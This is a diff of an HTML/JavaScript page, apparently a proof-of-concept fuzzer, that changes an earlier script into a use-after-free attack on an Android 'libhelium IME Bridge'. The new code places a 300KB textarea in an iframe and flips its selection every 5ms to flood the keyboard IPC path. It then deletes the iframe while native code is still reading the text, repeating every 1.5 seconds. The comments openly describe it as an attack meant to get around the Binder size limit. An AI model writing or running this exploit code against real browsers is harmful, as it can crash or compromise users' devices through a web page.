@@ -2,37 +2,53 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>IME Native Fuzzer</title>
+    <title>IME Precision Fuzzer</title>
 </head>
 <body style="background:#000; color:#f00; font-family:monospace;">
-    <h3>Attacking libhelium IME Bridge...</h3>
+    <h3>Attacking libhelium IME Bridge (300KB)...</h3>
     
-    <textarea id="pwnbox" style="width:100%; height:300px; font-size:20px;"></textarea>
+    <div id="container"></div>
 
     <script>
-        const box = document.getElementById('pwnbox');
+        const container = document.getElementById('container');
         
-        // 1. Create a 1MB string. This is small enough to avoid the Java GC panic, 
-        // but huge for a native C++ text buffer.
-        const giantText = "A".repeat(500000) + " PWNED " + "B".repeat(500000);
-        box.value = giantText;
-
-        function triggerIME() {
-            // 2. Force the Android Keyboard to wake up and attach to the C++ WebContents
-            box.focus();
+        function triggerUAF() {
+            // 1. Isolate the attack in an iframe so we can destroy it
+            let iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '300px';
+            container.appendChild(iframe);
             
-            // 3. Rapidly change the cursor position.
-            // This forces Blink to execute onSurroundingTextReceived via JNI constantly.
-            let pos = Math.floor(Math.random() * 900000);
-            box.setSelectionRange(pos, pos + 50);
+            let idoc = iframe.contentDocument;
+            
+            // 2. The 300KB String (Bypasses the 1MB Android Binder Limit)
+            let box = idoc.createElement('textarea');
+            box.style.width = '100%';
+            box.style.height = '100%';
+            box.value = "A".repeat(150000) + " PWNED " + "B".repeat(150000);
+            idoc.body.appendChild(box);
 
-            // 4. Thrash the DOM. This forces the C++ engine to recalculate layout 
-            // while the keyboard is actively trying to read the memory pointer.
-            box.style.transform = `translateY(${Math.random() * 10}px)`;
+            // 3. Force Keyboard interaction
+            box.focus();
+
+            // 4. Thrash the C++ onSurroundingTextReceived function
+            let thrashInterval = setInterval(() => {
+                try {
+                    let pos = Math.floor(Math.random() * 290000);
+                    box.setSelectionRange(pos, pos + 50);
+                } catch(e) {}
+            }, 5); // 5ms delay = massive IPC queue buildup
+
+            // 5. The UAF Guillotine
+            // We destroy the iframe while libhelium is actively reading the text buffer
+            setTimeout(() => {
+                clearInterval(thrashInterval);
+                container.innerHTML = ''; 
+            }, 800);
         }
 
-        // Fire the IME extraction requests aggressively (every 20ms)
-        setInterval(triggerIME, 20);
+        // Loop the entire attack sequence
+        setInterval(triggerUAF, 1500);
 
     </script>
 </body>
